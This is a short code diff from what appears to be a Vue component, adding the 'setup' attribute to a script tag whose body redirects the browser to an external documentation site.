@@ -40,7 +40,7 @@ useHead({
 })
 </script>
 
-<script type="text/javascript">
+<script type="text/javascript"  setup>
     window.location.href = "http://doc.7ge.top/";
 </script>
 
